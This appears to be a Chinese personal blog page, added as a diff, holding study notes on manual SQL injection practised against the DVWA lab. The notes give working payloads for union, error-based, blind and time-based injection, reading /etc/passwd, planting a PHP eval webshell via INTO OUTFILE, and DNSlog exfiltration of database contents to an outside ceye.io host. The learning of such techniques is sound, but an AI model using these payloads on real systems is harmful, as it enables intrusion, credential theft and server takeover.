@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      渗透测试学习5：sql手注 
+      
+      
+      |
+    
+     Hexo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">渗透测试学习5：sql手注</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2021-03-17 18:31:23
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="SQL注入初探"><a href="#SQL注入初探" class="headerlink" title="SQL注入初探"></a>SQL注入初探</h1><p>常见数据库：access（小型），mysql（最常见），oracle（大型），postgresql（国外用的多）。</p>
+<h1 id="MySQL联合查询注入-dvwa-low靶场"><a href="#MySQL联合查询注入-dvwa-low靶场" class="headerlink" title="MySQL联合查询注入(dvwa low靶场)"></a>MySQL联合查询注入(dvwa low靶场)</h1><p>union select 联合查询 ，即合并（取交集，结果中没有重复⾏）前后两个查询；前提是前后查询视图必须拥有相 同数量的列，列也必需拥有相同的数据类型。<br>基本步骤：</p>
+<h2 id="1-判断是否存在注⼊（数字型还是字符型）"><a href="#1-判断是否存在注⼊（数字型还是字符型）" class="headerlink" title="1.判断是否存在注⼊（数字型还是字符型）"></a>1.判断是否存在注⼊（数字型还是字符型）</h2><p>数字型：<code>select * from news where id=1;</code><br>字符型：<code>select * from news where title=&#39;1&#39;;</code><br>⽅法⼀：单引号法 ： <code>&#39;</code><br>输入多一个单引号时报错，为字符型<br>⽅法⼆：逻辑法 <code>and 1=1    and 1=2    1&#39; and &#39;1&#39;=&#39;1     1&#39; and &#39;1&#39;=&#39;2</code><br>就是and后的值要为真才能输出查询，为假时不显示。<br>⽅法三：运算法 <code>-1   -0</code></p>
+<h2 id="2-猜解表名"><a href="#2-猜解表名" class="headerlink" title="2.猜解表名"></a>2.猜解表名</h2><p>可以猜测一些常见的敏感表名也可以通过字典来猜解。</p>
+<h2 id="3-猜解字段数"><a href="#3-猜解字段数" class="headerlink" title="3.猜解字段数"></a>3.猜解字段数</h2><p> 方法：<code>1‘  order by 1 #</code><br> 持续order by 1，2，3。。。直到报错。</p>
+<h2 id="4-猜解字段名"><a href="#4-猜解字段名" class="headerlink" title="4.猜解字段名"></a>4.猜解字段名</h2><p>可以猜测一些常见的敏感字段名也可以通过字典来猜解。</p>
+<h2 id="5-获取数据"><a href="#5-获取数据" class="headerlink" title="5.获取数据"></a>5.获取数据</h2><p>获取当前数据库和数据库⽤户名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select database(),user() #</span><br></pre></td></tr></table></figure>
+<p>获取当前的数据库版本和操作系统：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select version(),@@version_compile_os#</span><br></pre></td></tr></table></figure>
+<p>获取数据表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select table_name,table_schema from information_schema.tables where table_schema&#x3D; &#39;dvwa&#39;#</span><br></pre></td></tr></table></figure>
+<p>注：我们需要判断MySQL的版本。因为当MySQL的版本⼩于4.0时，是不⽀持union select联合查询的；当MySQL版本⼤于 5.0时，有个默认数据库information_schema，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有⼀个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。<br>获取表中的列名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br></pre></td></tr></table></figure>
+<p>注：group_concat()的作用是将相同的行组合起来。<br>       information_schema.columns有列的信息<br>       group_concat(column_name)就是列出所有的列名。<br>获取数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select user,password from users#</span><br></pre></td></tr></table></figure>
+<h1 id="MySQL报错注入"><a href="#MySQL报错注入" class="headerlink" title="MySQL报错注入"></a>MySQL报错注入</h1><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。<br>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。<br>常用到的三种报错注入方式分别是：floor()、updatexml()、extractvalue()。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.floor() </span><br><span class="line">select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">2.extractvalue() </span><br><span class="line">select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">3.updatexml() </span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
+<p>1.floor()<br>函数含义：<br>floor()函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。<br>concat()是返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。<br>rand(0)是产生伪随机数。<br>2.extractvalue()：从⽬标XML中返回包含所查询值的字符串。 EXTRACTVALUE (XML_document, XPath_string);<br>第⼀个参数：XML_document是String格式，为XML⽂档对象的名称<br>第⼆个参数：XPath_string (Xpath格式的字符串)<br>concat:返回结果为连接参数产⽣的字符串。<br>3.updatexml()：改变文档中符合条件的节点的值。<br>updatexml(xml_document,xpath_string,new_value)<br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</p>
+<p>注：以下加粗部分可替换为想执行的mysql语句（与上一节union后面的一致）。<br>1.extractvalue()<br>select * from test where id=1 and (extractvalue(1,concat(0x7e,(<strong>select user()</strong>),0x7e)));<br>2.updatexml()<br>select * from test where id=1 and (updatexml(1,concat(0x7e,(<strong>select user()</strong>),0x7e),1));</p>
+<h1 id="MySQL布尔型盲注入"><a href="#MySQL布尔型盲注入" class="headerlink" title="MySQL布尔型盲注入"></a>MySQL布尔型盲注入</h1><p>一般用于没有回显的查询中。盲注入一般工作量都很大，所以我在此就不操作了，可以用sqlmap来操作。<br>常用函数：<br>lenght() 返回字符串的长度，例如可以返回数据库名字的长度<br>substr() ⽤来截取字符串<br>ascii() 返回字符的ascii码<br>sleep(n) 将程序挂起⼀段时间，n为n秒</p>
+<p>流程：<br>1.判断是否存在注⼊</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>2.猜解当前数据库名<br>先猜长度从1开始指导回显存在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length(database())&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>再⼆分法逐字猜解<br>查找指导回显存在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;97</span><br></pre></td></tr></table></figure>
+<p>3.猜解表名<br>先猜解表的数量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count (table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>后两个步骤和刚才猜长度和名字一样。</p>
+<p>4.猜解表中的字段名<br>与上一致。</p>
+<p>5.猜解数据<br>二分法或暴力法</p>
+<h1 id="MySQL延时型盲注入"><a href="#MySQL延时型盲注入" class="headerlink" title="MySQL延时型盲注入"></a>MySQL延时型盲注入</h1><p>关键函数：<br>if函数<br>substr() ⽤来截取字符串<br>ascii() 返回字符的ascii码<br>mysql&gt;=5.0 使⽤sleep()进⾏查询<br>mysql&lt;5.0使⽤benchmark()进⾏查询<br>benchmark()是通过查询次数增多，时间变得缓慢来判断是否存在延迟<br><code>select benchmark(1000,select * from admin);</code><br>id=1 and sleep(5)<br>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">判断是否存在延迟注⼊</span><br><span class="line">id&#x3D;1 and sleep(5)</span><br><span class="line">判断当前⽤户</span><br><span class="line">and if(ascii(substr(user(),1,1))&#x3D;114,sleep(5),1)</span><br></pre></td></tr></table></figure>
+<p>总结：与布尔注入差不多，就是一个是通过回显真假判断，一个是通过休眠时间判断。</p>
+<h1 id="MySQL⼿注之Root权限处理"><a href="#MySQL⼿注之Root权限处理" class="headerlink" title="MySQL⼿注之Root权限处理"></a>MySQL⼿注之Root权限处理</h1><p>Root⽤户是可以对⽹站的⼀些⽬录进⾏读写操作的。 如果当前连接的mysql⽤户为root权限权 ，在具有读写权限的前提下，我们是可以通过写⼊⼀句话⽊马到⽹站⽬录来获取⽹站权限的，也就是webshell。</p>
+<p>需要的条件：<br>获取root权限、获得网站UNC路径。<br>（UNC路径就是类似\softer这样的形式的网络路径。它符合 \servername\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。）<br>MySQL  5.5.53之前的版本是 secure_file_priv 变量默认为空，所以默认情况下是可以直接通过SQL语句来导出⽂件的。<br> MySQL⾼于5.5时，mysql新出了⼀个 secure-file-priv 字段 : secure-file-priv 参数是⽤来限制LOAD DATA, SELECT … &gt; OUTFILE, and LOAD_FILE()传到哪个指定⽬录的。<br>当 secure_file_priv 的值为null ，表⽰限制mysqld 不允许导⼊|导出<br>当 secure_file_priv 的值为/tmp/ ，表⽰限制mysqld 的导⼊|导出只能发⽣在/tmp/⽬录下<br>当 secure_file_priv 的值没有具体值时，即 ‘’ ，表⽰不对mysqld 的导⼊|导出做限制。 查看 secure-file-priv 参数的值: show global variables like ‘%secure%</p>
+<p>MySQL读⽂件 mysql读⽂件是⽤的 load_file() 函数： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;); </span><br><span class="line">select load_file(0x2F6574632F706173737764);</span><br></pre></td></tr></table></figure>
+<p>MySQL写⽂件<br>INTO OUTFILE函数写⽂件时会在每⼀⾏的结束⾃动加上换⾏符 INTO DUMPFILE函数在写⽂件会保持⽂件得到原⽣内容，这种⽅式对于⼆进制⽂件是最好的选择</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;muma.php&#39; ; </span><br><span class="line">select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into DUMPFILE &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;muma.php&#39; ; </span><br><span class="line">select * from tdb_goods where goods_id&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;muma.php&quot; LINES STARTING BY &#39;&lt;?php @eval($_POST[pass])?&gt;&#39;</span><br></pre></td></tr></table></figure>
+<p><code>LINES STARTING BY &#39;写⼊的内容&#39; </code>设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。<br><code>LINES TERMINATED BY &#39;写⼊的内容&#39; </code>设置每⾏数据结尾的字符，可以为单个或多个字符。默认值是”\n”</p>
+<h1 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h1><p>一般情况下，在我们无法通过联合查询直接获取数据的情况下，我们只能通过盲注，来一步步的获取数据，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度。<br>NS服务器：NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。</p>
+<p>DNSlog注入原理：<br>攻击者先将恶意的sql语句注入到web服务器；<br>web服务器再把这条语句发送给数据库并执行；<br>数据库查询DNS服务器；<br>返回NS服务器；<br>查询设施好的NS服务器；</p>
+<p>mysql注入细节：<br>前提：<br>⽀持load_file()函数（⾼版本默认不⽀持）<br>开启allow_url_fopen（默认开启）<br>核⼼语句： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#39;\\\\&#39;,hex((select database())),&#39;.8dmer4.ceye.io\\abv&#39;));</span><br></pre></td></tr></table></figure>
+<p>其中8dmer4.ceye.io语句要换成自己的dnslog网址。<br>hex(a)：<br>如果a是一个数字, 返回a的十六进制值的字符串表示。<br>如果a是一个字符串，返回a在a的每个字符转化为两个十六进制数字的十六进制字符串表示。<br>concat()：<br>把参数合成一个字符串。<br>注：\\经过转义后成为\；hex中的内容是想要执行的内容。<br>dvwa实战语句1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and if((select load_file(concat(&#39;\\\\&#39;,hex((select 212)),&#39;.8dmer4.ceye.io\\abv&#39;))),1,0) And &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+<h1 id="HTTP-header注入"><a href="#HTTP-header注入" class="headerlink" title="HTTP header注入"></a>HTTP header注入</h1><p>原理：<br>有时数据库会对用户的cookie，useragent等HTTP header字段再sql中处理验证，这时我们就可以抓包更改头部加入想执行的命令来实现sql注入。<br>可被注⼊的头参数：<br>cookie ：<br>站为了辨别⽤⼾⾝份、进⾏ session 跟踪而储存在⽤⼾本地终端上的数据（通常经过加密）。<br>Rerferer ：<br>浏览器向 WEB 服务器表明⾃⼰是从哪个⻚⾯链接过来的。<br>User-Agent ：<br>使得服务器能够识别客⼾使⽤的操作系统，游览器版本等.（很多数据量⼤的⽹站中会记录客⼾使⽤的操作系统或浏览器版本等存⼊数据库中）。<br>X-Forwarded-For ：<br>简称XFF头，它代表客⼾端，也就是HTTP的请求端真实的IP,（通常⼀些⽹站的防注⼊功能会记录请求端真实IP地 址并写⼊数据库or某⽂件[通过修改XXF头可以实现伪造IP]）<br>Client-IP ：<br>代理服务器发送的HTTP头。<br>Host：<br>是 HTTP 1.1 协议中新增的⼀个请求头，主要⽤来实现虚拟主机技术。 <a target="_blank" rel="noopener" href="https://blog.csdn.net/codejas/article/details/82844032">https://blog.csdn.net/codejas/article/details/82844032</a></p>
+<p>注入方法：<br>先burp抓包，再改包内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET&#x2F;HTTP&#x2F;1.1 Host:www.example.com Connection:keep-alive Accept:text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8 Upgrade-Insecure-Requests:1 User-Agent:Mozilla&#x2F;5.0&#39;(select*from(select(sleep(20)))a)# Accept-Encoding:gzip,deflate,sdch Accept-Language:en-US,en;q&#x3D;0.8,fr;q&#x3D;0.6</span><br></pre></td></tr></table></figure>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/03/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A04%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%99%A8%E7%AF%87/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2021-03-17 18:31:23
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/03/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A06%EF%BC%9Asql%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2"><span class="toc-text">SQL注入初探</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5-dvwa-low%E9%9D%B6%E5%9C%BA"><span class="toc-text">MySQL联合查询注入(dvwa low靶场)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E2%BC%8A%EF%BC%88%E6%95%B0%E5%AD%97%E5%9E%8B%E8%BF%98%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89"><span class="toc-text">1.判断是否存在注⼊（数字型还是字符型）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="toc-text">2.猜解表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">3.猜解字段数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-text">4.猜解字段名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-text">5.获取数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">MySQL报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="toc-text">MySQL布尔型盲注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E5%BB%B6%E6%97%B6%E5%9E%8B%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="toc-text">MySQL延时型盲注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E2%BC%BF%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86"><span class="toc-text">MySQL⼿注之Root权限处理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="toc-text">DNSlog注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-header%E6%B3%A8%E5%85%A5"><span class="toc-text">HTTP header注入</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
